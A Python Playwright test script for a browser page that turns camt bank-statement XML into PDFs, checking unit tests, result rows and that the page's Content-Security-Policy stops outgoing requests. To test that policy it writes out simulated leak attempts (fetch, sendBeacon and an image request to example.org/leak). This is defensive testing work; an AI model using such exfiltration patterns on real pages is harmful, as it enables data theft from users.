"""Run the browser tests and an end-to-end check of the real page.

1. tests/test.html: unit tests of docs/camt.js against samples/.
2. docs/index.html: upload the samples through the file picker, check the
   result rows, and check that the Content-Security-Policy blocks outgoing
   requests while the page itself causes no CSP violations.

Uses an installed browser, so nothing is downloaded:
    python tests/run_tests.py                    # Chrome (CI)
    python tests/run_tests.py --channel msedge   # Edge (Windows)
"""

import argparse
import functools
import http.server
import sys
import threading
from pathlib import Path

from playwright.sync_api import sync_playwright

ROOT = Path(__file__).resolve().parent.parent
SAMPLES = ROOT / "samples"


def serve() -> tuple[http.server.ThreadingHTTPServer, str]:
    class Quiet(http.server.SimpleHTTPRequestHandler):
        def log_message(self, *args):
            pass

    handler = functools.partial(Quiet, directory=str(ROOT))
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    return server, f"http://127.0.0.1:{server.server_address[1]}"


def watch(page, problems: list[str]) -> None:
    page.on("console", lambda m: m.type == "error" and problems.append(f"console error: {m.text}"))
    page.on("pageerror", lambda e: problems.append(f"page error: {e}"))


def unit_tests(page, base: str) -> list[str]:
    problems: list[str] = []
    watch(page, problems)
    page.goto(f"{base}/tests/test.html")
    page.wait_for_function("() => document.getElementById('result').dataset.status !== 'running'", timeout=120_000)
    print(page.inner_text("#result"))
    if page.get_attribute("#result", "data-status") != "pass":
        problems.append("unit tests failed")
    return problems


def page_tests(page, base: str) -> list[str]:
    problems: list[str] = []
    watch(page, problems)
    page.add_init_script("""
        window.__csp = [];
        document.addEventListener('securitypolicyviolation',
            e => window.__csp.push(e.violatedDirective + ' ' + e.blockedURI));
    """)
    page.goto(f"{base}/docs/index.html")

    files = ["example_v02.xml", "example_v08_mismatch.xml", "example_no_balances.xml", "invalid_amount.xml"]
    page.set_input_files("#file", [str(SAMPLES / f) for f in files])
    page.wait_for_function(f"() => document.querySelectorAll('#list li').length === {len(files)}", timeout=60_000)
    rows = page.eval_on_selector_all("#list li", "els => els.map(e => e.innerText.replace(/\\s+/g, ' '))")
    expected = [
        ("example_v02.pdf", "saldo klopt"),
        ("example_v08_mismatch.pdf", "saldo wijkt af"),
        ("example_no_balances.pdf", "saldo niet gecontroleerd"),
        ("invalid_amount.xml", 'Afgekeurd – er is geen PDF gemaakt. Afschrift STMT-2026-09-30, transactie 2: ongeldig bedrag "1200,00".'),
    ]
    for row, (name, phrase) in zip(rows, expected):
        ok = row.startswith(name) and phrase in row
        print(f"{'ok  ' if ok else 'FAIL'} page row: {row}")
        if not ok:
            problems.append(f"unexpected row for {name}")
    if page.locator("#list a.btn").count() != 3:
        problems.append("expected 3 download buttons")

    violations = page.evaluate("() => window.__csp")
    if violations:
        problems.append(f"CSP violations during normal use: {violations}")
    else:
        print("ok   page runs without CSP violations")

    # The policy must stop data leaving the page, whatever code tries it.
    blocked = page.evaluate("""async () => {
        const out = {};
        try { await fetch('https://example.org/leak?x=1'); out.fetch = 'allowed'; } catch { out.fetch = 'blocked'; }
        try { navigator.sendBeacon('https://example.org/leak'); } catch {}
        const img = new Image(); img.src = 'https://example.org/leak.png';
        await new Promise(r => setTimeout(r, 500));
        out.violations = window.__csp.slice();
        return out;
    }""")
    directives = " ".join(blocked["violations"])
    for what, ok in [("fetch", blocked["fetch"] == "blocked"),
                     ("connect-src", "connect-src" in directives),
                     ("img-src", "img-src" in directives)]:
        print(f"{'ok  ' if ok else 'FAIL'} outgoing request blocked: {what}")
        if not ok:
            problems.append(f"CSP did not block {what}")
    # The browser logs the deliberately blocked requests as console errors; those are expected.
    return [p for p in problems if "example.org" not in p]


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--channel", default="chrome", help="installed browser: chrome or msedge")
    args = ap.parse_args()

    server, base = serve()
    problems: list[str] = []
    with sync_playwright() as p:
        browser = p.chromium.launch(channel=args.channel)
        problems += unit_tests(browser.new_page(), base)
        problems += page_tests(browser.new_page(), base)
        browser.close()
    server.shutdown()

    for prob in problems:
        print(f"ERROR {prob}", file=sys.stderr)
    print("\nALL CHECKS PASSED" if not problems else f"\n{len(problems)} PROBLEM(S)")
    return 1 if problems else 0


if __name__ == "__main__":
    sys.exit(main())
